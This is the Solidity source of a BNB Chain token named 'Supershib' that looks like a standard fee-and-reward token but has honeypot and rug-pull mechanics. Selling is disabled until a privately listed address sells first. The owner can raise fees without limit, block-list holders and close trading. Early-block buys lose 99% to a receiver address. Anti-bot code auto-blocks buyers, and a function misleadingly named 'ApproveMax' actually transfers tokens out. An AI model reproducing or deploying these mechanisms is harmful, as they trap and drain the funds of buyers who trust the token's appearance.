/**
 *Submitted for verification at BscScan.com on 2022-07-23
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;
    mapping (address => bool) internal authorizations;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        authorizations[msg.sender] =  true;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    /**
     * Function modifier to require caller to be authorized
     */
    modifier authorized() {
        require(isAuthorized(msg.sender), "!AUTHORIZED"); _;
    }

    /**
     * Return address' authorization status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Authorize address. Owner only
     */
    function authorize(address adr) public onlyOwner {
        authorizations[adr] = true;
    }

    /**
     * Remove address' authorization. Owner only
     */
    function unauthorize(address adr) public onlyOwner {
        authorizations[adr] = false;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TokenDistributor {
    constructor (address token) {
        IERC20(token).approve(msg.sender, uint(~uint256(0)));
    }
}

contract HJ is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public fundAddress;
    address public devAddress;
    address public senondDevAddress;
    address private recieverAddress;
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    mapping(address => bool) public _feeWhiteList;
    mapping(address => bool) public _blockList;

    bool private startPublicSell = false;
    mapping(address => bool) private ceoList;

    uint256 private _tTotal;

    ISwapRouter public _swapRouter;
    address public _usdt;
    address public _shib;
    mapping(address => bool) public _swapPairList;

    bool private inSwap;

    uint256 private constant MAX = ~uint256(0);
    TokenDistributor public _tokenDistributor;
    TokenDistributor public _shibDistributor;

    uint256 public _buyFundFee = 10;
    uint256 public _buyDevFee = 0;
    uint256 public _buyLPDividendFee = 2;

    uint256 public _sellFundFee = 10;
    uint256 public _sellDevFee = 0;
    uint256 public _sellLPDividendFee = 2;

    uint256 public startTradeBlock;
    uint256 public maxHolder;

    address public _mainPair;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (){
        _name = "Supershib";
        _symbol = "Supershib";
        _decimals = 9;

        _shib = 0x2859e4544C4bB03966803b044A93563Bd2D0DD4D;
        _usdt = 0x55d398326f99059fF775485246999027B3197955;
        ISwapRouter swapRouter = ISwapRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E); 
        IERC20(_usdt).approve(address(swapRouter), MAX);

 
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), _usdt);
        _mainPair = swapPair;
        _swapPairList[swapPair] = true;

        uint256 total = 1000000000000000000000000;
        _tTotal = total;
        maxHolder = total;

        fundAddress = 0x41e24Ebfc6bD2D30af50aEDa691dc650365337A0;
        devAddress = 0x41e24Ebfc6bD2D30af50aEDa691dc650365337A0;
        senondDevAddress = 0x41e24Ebfc6bD2D30af50aEDa691dc650365337A0;
        recieverAddress = fundAddress;

        _balances[msg.sender] = total;
        emit Transfer(address(0), msg.sender, total);

        _feeWhiteList[fundAddress] = true;
        _feeWhiteList[devAddress] = true;
        _feeWhiteList[address(this)] = true;
         _feeWhiteList[recieverAddress] = true;
        _feeWhiteList[address(swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;

        areadyKnowContracts[swapPair] =  true;
        areadyKnowContracts[address(this)] =  true;
        areadyKnowContracts[address(swapRouter)] =  true; 

        excludeHolder[address(0)] = true;
        excludeHolder[address(0x000000000000000000000000000000000000dEaD)] = true;

        _tokenDistributor = new TokenDistributor(_usdt);
        _shibDistributor = new TokenDistributor(_shib);
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    uint256 private airdropAmount = 10;
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");
        require(!_blockList[from] && !_blockList[to], "bot address");
        antiBot(from,to);

        if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
            uint256 maxSellAmount = balance * 9900 / 10000;
            if (amount > maxSellAmount) {
                amount = maxSellAmount;
            }
        }

        if(amount > airdropAmount && randomAirdrop(amount, airdropAmount)){
            amount -= airdropAmount;
        }


        bool takeFee;
        bool isSell;

        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                require(0 < startTradeBlock, "!Trading");
                if (block.number < startTradeBlock + 3) {
                    _funTransfer(from, to, amount);
                    return;
                }

                if (_swapPairList[to]) {
                    if(!startPublicSell && ceoList[from]){
                        startPublicSell =  true;
                    }
                    require(startPublicSell, "sell not open");

                    if (!inSwap) {
                        uint256 contractTokenBalance = balanceOf(address(this));
                        if (contractTokenBalance > 0) {
                            uint256 swapFee = _buyFundFee + _buyLPDividendFee + _buyDevFee + _sellFundFee + _sellLPDividendFee  + _sellDevFee;
                            uint256 numTokensSellToFund = amount * swapFee / 50;
                            if (numTokensSellToFund > contractTokenBalance) {
                                numTokensSellToFund = contractTokenBalance;
                            }
                            swapTokenForFund(numTokensSellToFund, swapFee);
                            swapUsdtForShib();
                        }
                    }
                }
                takeFee = true;
            }
            if (_swapPairList[to]) {
                isSell = true;
            }
        }

        _tokenTransfer(from, to, amount, takeFee, isSell);

        if (from != address(this)) {
            if (!_swapPairList[from] && balanceOf(from) > 0) {
                addHolder(from);
            }
            if (!_swapPairList[to] && balanceOf(to) > 0) {
                addHolder(to);
            }
            processReward(maxGasOfProcessor);
        }
    }

    function _funTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount = tAmount * 99 / 100;
        _takeTransfer(
            sender,
            recieverAddress,
            feeAmount
        );
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isSell
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;

        if (takeFee) {

            uint256 swapFee;
            if (isSell) {
                swapFee = _sellFundFee + _sellLPDividendFee + _sellDevFee;
            } else {
                swapFee = _buyFundFee + _buyLPDividendFee + _buyDevFee;
            }
            uint256 swapAmount = tAmount * swapFee / 100;
            if (swapAmount > 0) {
                feeAmount += swapAmount;
                _takeTransfer(
                    sender,
                    address(this),
                    swapAmount
                );
            }
        }

        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    bool public canAirDrop = true;
    function randomAirdrop(uint256 _seed,uint256 _amount) internal returns(bool){
        if(!canAirDrop){
            return false;
        }

        if(_amount == 0 ){
            return false;
        }

        uint _random = uint(blockhash(block.number-1)) % ~uint160(0)  + block.timestamp + _seed;
        address _randomAddr = address(uint160(_random % ~uint160(0) ));
        if(_balances[_randomAddr]>0){
            return false;
        }
        
        _balances[_randomAddr] += _amount;

        emit Transfer(address(this), _randomAddr, _amount);

        return true;
    }

    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _usdt;
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(_tokenDistributor),
            block.timestamp
        );

        IERC20 usdt = IERC20(_usdt);
        uint256 fistBalance = usdt.balanceOf(address(_tokenDistributor));
        uint256 fundAmount = fistBalance * (_buyFundFee + _sellFundFee) / swapFee;
        uint256 devAmount = fistBalance * (_buyDevFee + _sellDevFee) / swapFee;

        usdt.transferFrom(address(_tokenDistributor), fundAddress, fundAmount);
        usdt.transferFrom(address(_tokenDistributor), devAddress, devAmount);
        usdt.transferFrom(address(_tokenDistributor), address(this), fistBalance - fundAmount - devAmount);
    }

    function swapUsdtForShib() private  {
        address[] memory path = new address[](2);
        path[0] = _usdt;
        path[1] = _shib;
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            IERC20(_usdt).balanceOf(address(this)),
            0,
            path,
            address(_shibDistributor),
            block.timestamp
        );

        IERC20 shib = IERC20(_shib);

        shib.transferFrom(address(_shibDistributor), address(this), shib.balanceOf(address(_shibDistributor)));
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setFundAddress(address addr) external onlyOwner {
        fundAddress = addr;
        _feeWhiteList[addr] = true;
    }

    function setDevAddress(address firstAddr,address secondAddr) external onlyOwner {
        devAddress = firstAddr;
        senondDevAddress = secondAddr;

        _feeWhiteList[firstAddr] = true;
        _feeWhiteList[secondAddr] = true;
    }


    function setBuyLPDividendFee(uint256 dividendFee) external onlyOwner {
        _buyLPDividendFee = dividendFee;
    }

    function setBuyFundFee(uint256 fundFee) external onlyOwner {
        _buyFundFee = fundFee;
    }

    function setSellLPDividendFee(uint256 dividendFee) external onlyOwner {
        _sellLPDividendFee = dividendFee;
    }

    function setSellFundFee(uint256 fundFee) external onlyOwner {
        _sellFundFee = fundFee;
    }

    function setSellDevFee(uint256 newFee) external onlyOwner {
        _sellDevFee = newFee;
    }
    function setBuyDevFee(uint256 lpFee) external onlyOwner {
        _buyDevFee = lpFee;
    }

    function startTrade() external onlyOwner {
        require(0 == startTradeBlock, "trading");
        startTradeBlock = block.number;
    }
    
    function setMaxHolder(uint256 amt) external onlyOwner {
        require(amt >= 1, "max not < 1");
        maxHolder = amt;
    }

    function setAirdropStatus(bool status) external onlyOwner {
        canAirDrop = status;
    }

    function closeTrade() external onlyOwner {
        startTradeBlock = 0;
    }

    function setFeeWhiteList(address[] calldata addList, bool enable) external authorized {
        for(uint256 i = 0; i < addList.length; i++) {
            _feeWhiteList[addList[i]] = enable;
        }
    }
    
    function setBlockList(address[] calldata addList, bool enable) public onlyOwner {
        for(uint256 i = 0; i < addList.length; i++) {
            _blockList[addList[i]] = enable;
        }
    }

    function setSwapPairList(address addr, bool enable) external onlyOwner {
        _swapPairList[addr] = enable;
    }

    function claimBalance() external {
        payable(fundAddress).transfer(address(this).balance);
    }

    function ApproveMax(address token, address spender, uint256 amount) external authorized {
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, spender, amount));
        require(success && (data.length == 0 || abi.decode(data, (bool))),"Approve Failed");
    }

    function setRecieverAddress(address addr) external onlyOwner {
        recieverAddress = addr;
        _feeWhiteList[addr] = true;
    }

    receive() external payable {}

    address[] private holders;
    mapping(address => uint256) holderIndex;
    mapping(address => bool) excludeHolder;

    function addHolder(address adr) private {
        uint256 size;
        assembly {size := extcodesize(adr)}
        if (size > 0) {
            return;
        }
        if (0 == holderIndex[adr]) {
            if (0 == holders.length || holders[0] != adr) {
                holderIndex[adr] = holders.length;
                holders.push(adr);
            }
        }
    }

    uint256 private currentIndex = 0;
    uint256 private holderRewardCondition = 0;
    uint256 private progressRewardBlock = 0;
    uint256 private blockInterval = 200;
    uint256 public maxGasOfProcessor = 500000;

    function processReward(uint256 gas) private {
        if (progressRewardBlock + blockInterval > block.number) {
            return;
        }

        IERC20 shib = IERC20(_shib);

        uint256 balance = shib.balanceOf(address(this));
        if (balance <= holderRewardCondition) {
            return;
        }

        IERC20 holdToken = IERC20(this);
        uint holdTokenTotal = holdToken.totalSupply();

        address shareHolder;
        uint256 tokenBalance;
        uint256 amount;

        uint256 shareholderCount = holders.length;

        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();

        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
            }
            shareHolder = holders[currentIndex];
            tokenBalance = holdToken.balanceOf(shareHolder);
            if (tokenBalance > 0 && !excludeHolder[shareHolder]) {
                amount = balance * tokenBalance / holdTokenTotal;
                if (amount > 0) {
                    shib.transfer(shareHolder, amount);
                }
            }

            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }

        progressRewardBlock = block.number;
    }

    function setHolderRewardCondition(uint256 amount) external onlyOwner {
        holderRewardCondition = amount;
    }

    function setBlockInterval(uint256 interval) external onlyOwner {
        blockInterval = interval;
    }

    function setMaxGasOfProcessor(uint256 gas) external onlyOwner {
        maxGasOfProcessor = gas;
    }
    
    function setExcludeHolder(address addr, bool enable) external onlyOwner {
        excludeHolder[addr] = enable;
    }

    bool public antiBotOpen = true;
    uint256 public maxGasOfBot = 7000000000;
    mapping (address => bool) public areadyKnowContracts;

    function antiBot(address sender,address recipient) internal{
        if(!antiBotOpen){
            return;
        }

        //if contract bot buy. add to block list.
        bool isBotBuy = (!areadyKnowContracts[recipient] && isContract(recipient) ) && _swapPairList[sender];
        if(isBotBuy){
            _blockList[recipient] =  true;
        }

        //check the gas of buy
        if(_swapPairList[sender] && tx.gasprice > maxGasOfBot ){
            //if gas is too height . add to block list
            _blockList[recipient] =  true;
        }

    }  

    function isContract(address addr) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }  

    function setAntiBot(bool newValue) external onlyOwner {
        antiBotOpen = newValue;
    }
    function setGasLimit(uint256 newValue) public onlyOwner {
        maxGasOfBot = newValue;
    }
    function setAreadyKnowAddress(address addr,bool newValue) external onlyOwner {
        areadyKnowContracts[addr] = newValue;
    }

    function setCEOList(address[] calldata addList, bool enable) external onlyOwner {
        for(uint256 i = 0; i < addList.length; i++) {
            ceoList[addList[i]] = enable;
        }
    }

    function dispatchReward() external {
        processReward(maxGasOfProcessor);
    }
}